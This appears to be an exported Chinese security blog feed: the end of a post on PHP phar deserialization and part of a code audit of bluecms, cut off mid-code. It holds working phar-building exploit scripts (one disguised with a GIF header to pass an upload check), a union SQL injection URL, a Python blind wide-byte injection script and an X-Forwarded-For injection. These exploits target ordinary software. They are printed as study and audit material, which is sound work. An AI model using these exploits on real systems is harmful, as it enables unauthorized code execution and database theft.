class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>06<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>01".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>21<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>92<span class="tag">\<span class="name">x</span></span>4f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span>".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xd</span></span>9";</span></span><br><span class="line"><span class="formula"></span></span><br><span class="line"><span class="formula">$</span>phar = new Phar("phar.phar");</span><br><span class="line"><span class="formula">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="formula">$</span>phar-&gt;addFromString("test.txt","test");</span><br><span class="line"><span class="formula">$phar-&gt;setStub($</span>jpeg_header_size." __HALT_COMPILER(); ?&gt;");</span><br><span class="line"><span class="formula">$o = new TestObject();</span></span><br><span class="line"><span class="formula">$</span>phar-&gt;setMetadata(<span class="formula">$o);</span></span><br><span class="line"><span class="formula">$</span>phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>



<h2 id="phar反序列化原理"><a href="#phar反序列化原理" class="headerlink" title="phar反序列化原理"></a>phar反序列化原理</h2><p>使用phra://伪协议读取文件的时候，文件会被解析成phar对象，这个时候，刚才那部分的序列化的信息就会被反序列化，这就是漏洞的原理。<br>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $name;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"这是析构函数"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$file = <span class="string">"phar://test.phar"</span>;</span><br><span class="line">@file_get_contents($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/10/phar/2.png" alt><br>当我们运行时调用了User类的析构函数</p>
<h1 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h1><p>一、</p>
<p>被攻击代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = $_GET[<span class="string">'test'</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span>  <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span>  $name;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents($test);</span><br></pre></td></tr></table></figure>

<p>攻击代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $name=<span class="string">"phpinfo();"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    @unlink(<span class="string">"2.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"2.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"text.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/10/phar/3.png" alt><br>成功调用了__destruct()方法，导致执行了eval()函数。<br>二、</p>
<p>测试代码如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">upload_file.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span></span><br><span class="line"><span class="php">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">  &#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br></pre></td></tr></table></figure>

<p>实现了一个简单的上传功能，只允许上传 <code>.gif</code> 文件。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">file_un.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$filename=$_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">file_exists($filename);</span></span><br></pre></td></tr></table></figure>

<p>这里定义了一个类，在 <code>__destruct</code> 方法中会调用 <code>eval</code> 来执行类属性中的代码。</p>
<p><code>file_exists</code> 的参数我们可控，所以可以通过 <code>phar</code> 来反序列化 <code>AnyClass</code> ， 进而实现 代码执行。</p>
<p>利用步骤</p>
<p>首先构造一个 <code>phar</code>文件并上传到服务器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span></span><br><span class="line"><span class="php">	    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span></span><br><span class="line"><span class="php">	    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">	    &#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;output);</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span></span><br><span class="line"><span class="php">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">    $phar-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);   <span class="comment">//设置stub，增加gif文件头</span></span></span><br><span class="line"><span class="php">    $phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);  <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php">    $object = <span class="keyword">new</span> AnyClass();</span></span><br><span class="line"><span class="php">    $object-&gt;output = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    $phar-&gt;setMetadata($object);  <span class="comment">//将自定义meta-data存入manifest</span></span></span><br><span class="line"><span class="php">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>然后把 <code>phar.phar</code> 上传<br>最后访问 <code>file_un.php</code>， 使用 <code>phar://</code> 来触发反序列化。</p>
<p>参考链接：<a href="https://xz.aliyun.com/t/6258" target="_blank" rel="noopener">https://xz.aliyun.com/t/6258</a></p>
]]></content>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>bluecms代码审计</title>
    <url>/2020/08/04/bluecms/</url>
    <content><![CDATA[<p><strong>bluecms代码审计</strong></p>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天审计的xhcms的漏洞太多太明显了，而且漏洞的利用方式都大概差不多，几乎没有什么过滤，今天准备学习审计一下bluecms，听说也是入门级的</p>
<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="Seay"><a href="#Seay" class="headerlink" title="Seay"></a>Seay</h2><p><img src="/2020/08/04/bluecms/1596784436097.png" alt="1596784436097"></p>
<p>300多个漏洞</p>
<h2 id="rips"><a href="#rips" class="headerlink" title="rips"></a>rips</h2><p><img src="/2020/08/04/bluecms/1596784474353.png" alt="1596784474353"></p>
<p>使用rips扫描得到66个漏洞</p>
<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h2><h3 id="ad-js-php"><a href="#ad-js-php" class="headerlink" title="ad_js.php"></a>ad_js.php</h3><p>首先是<strong>ad_js.php</strong>文件中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">'IN_BLUE'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/include/common.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">if</span>($ad[<span class="string">'time_set'</span>] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其传入的$ad_id为经过过滤，查看一下getone方法，其在/include/mysql.class.php文件中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql, $type=MYSQL_ASSOC)</span></span>&#123;</span><br><span class="line">	$query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">	$row = mysql_fetch_array($query, $type);	</span><br><span class="line">	<span class="keyword">return</span> $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有</p>
<p>该函数为一个执行sql语句的函数，存在sql注入，但是去执行的时候发现单引号被转译了，被转译的原因为其包含了/include/common.inc.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>include/common.fun.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($str <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">		&#123;</span><br><span class="line">			$str[$key] = deep_addslashes($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$str = addslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>addslashes函数会将一些特殊字符添加反斜杠进行转译。但是仔细一看，$ad_id参数并未被引号包裹，所以该函数不起任何作用</p>
<p><strong>复现</strong></p>
<p>访问<a href="http://127.0.0.1/bulecms1.6/ad_js.php?ad_id=1，输入单引号报错" target="_blank" rel="noopener">http://127.0.0.1/bulecms1.6/ad_js.php?ad_id=1，输入单引号报错</a></p>
<p><img src="/2020/08/04/bluecms/1596785617312.png" alt="1596785617312"></p>
<p>使用联合查询，当sql语句正确时不显示，语句错误时报错，在网页源码中可看到回显</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">view-source:http:<span class="comment">//127.0.0.1/bulecms1.6/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/04/bluecms/1596786872646.png" alt="1596786872646"></p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="user-php"><a href="#user-php" class="headerlink" title="user.php"></a><strong>user.php</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'index_login'</span>)&#123;</span><br><span class="line">	$user_name = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'user_name'</span>]) ? trim($_REQUEST[<span class="string">'user_name'</span>]) : <span class="string">''</span>;</span><br><span class="line">	$pwd = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'pwd'</span>]) ? trim($_REQUEST[<span class="string">'pwd'</span>]) : <span class="string">''</span>;</span><br><span class="line">	$remember = <span class="keyword">isset</span>($_REQUEST[<span class="string">'remember'</span>]) ? intval($_REQUEST[<span class="string">'remember'</span>]) : <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>($user_name == <span class="string">''</span>)&#123;</span><br><span class="line">		showmsg(<span class="string">'用户名不能为空'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($pwd == <span class="string">''</span>)&#123;</span><br><span class="line">		showmsg(<span class="string">'密码不能为空'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">$row = $db-&gt;getone(<span class="string">"SELECT COUNT(*) AS num FROM "</span>.table(<span class="string">'admin'</span>).<span class="string">" WHERE admin_name='$user_name'"</span>);</span><br><span class="line"><span class="keyword">if</span>($row[<span class="string">'num'</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">	showmsg(<span class="string">'系统用户组不能从前台登录'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在sql语句中user_name未经过严格过滤，可直接进行注入，但是由于会将单引号等特殊符号进行转译，所以可进行宽字节注入<br><img src="/2020/08/04/bluecms/1596845940416.png" alt="1596845940416"></p>
<p><img src="/2020/08/04/bluecms/1596845964921.png" alt="1596845964921"></p>
<p>根据其回显不同，可进行bool盲注</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url = <span class="string">"http://xxxxxxxxxx/user.php?act=index_login"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (high + low) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        <span class="comment">#获取数据库名</span></span><br><span class="line">        payload = <span class="string">"1%df' or ascii(substr(database(),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">"%23"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"user_name"</span> : payload,</span><br><span class="line">            <span class="string">"pwd"</span> : <span class="string">"2"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        print(data)</span><br><span class="line">        print(url)</span><br><span class="line">        res = requests.post(url = url , data = data)</span><br><span class="line"></span><br><span class="line">        print(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'系统用户组不能从前台登录'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high) // <span class="number">2</span></span><br><span class="line">    result+=chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h2 id="XFF注入-INSERT注入"><a href="#XFF注入-INSERT注入" class="headerlink" title="XFF注入(INSERT注入)"></a>XFF注入(INSERT注入)</h2><h3 id="include-common-inc-php"><a href="#include-common-inc-php" class="headerlink" title="/include/common.inc.php"></a>/include/common.inc.php</h3><p>在<strong>/include/common.inc.php</strong>文件中，可以发现其并未对$_SERVER进行过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">    $_POST = deep_addslashes($_POST);</span><br><span class="line">    $_GET = deep_addslashes($_GET);</span><br><span class="line">    $_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">    $_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以使用<code>X-Forwarded-For</code>或者<code>CLIENT-IP</code>可以伪装<code>ip</code>进行<code>SQL</code>注入</p>
<p>通过搜索可以发现在guest_book.php中存在有关ip的sql语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($act == <span class="string">'send'</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$user_id = $_SESSION[<span class="string">'user_id'</span>] ? $_SESSION[<span class="string">'user_id'</span>] : <span class="number">0</span>;</span><br><span class="line">	$rid = intval($_POST[<span class="string">'rid'</span>]);</span><br><span class="line"> 	$content = !<span class="keyword">empty</span>($_POST[<span class="string">'content'</span>]) ? htmlspecialchars($_POST[<span class="string">'content'</span>]) : <span class="string">''</span>;</span><br><span class="line"> 	$content = nl2br($content);</span><br><span class="line"> 	<span class="keyword">if</span>(<span class="keyword">empty</span>($content))</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		showmsg(<span class="string">'�������ݲ���Ϊ��'</span>);</span><br><span class="line"> 	&#125;</span><br><span class="line">	$sql = <span class="string">"INSERT INTO "</span> . table(<span class="string">'guest_book'</span>) . <span class="string">" (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">			VALUES ('', '$rid', '$user_id', '$timestamp', '$online_ip', '$content')"</span>;</span><br><span class="line">	$db-&gt;query($sql);</span><br><span class="line">	showmsg(<span class="string">'��ϲ�����Գɹ�'</span>, <span class="string">'guest_book.php?page_id='</span>.$_POST[<span class="string">'page_id'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在common.inc.php中$online_ip=getip()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">getip()</span><br><span class="line"></span><br><span class="line">  */</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">	&#123; <span class="comment">//��ȡ�ͻ����ô������������ʱ����ʵip ��ַ</span></span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span 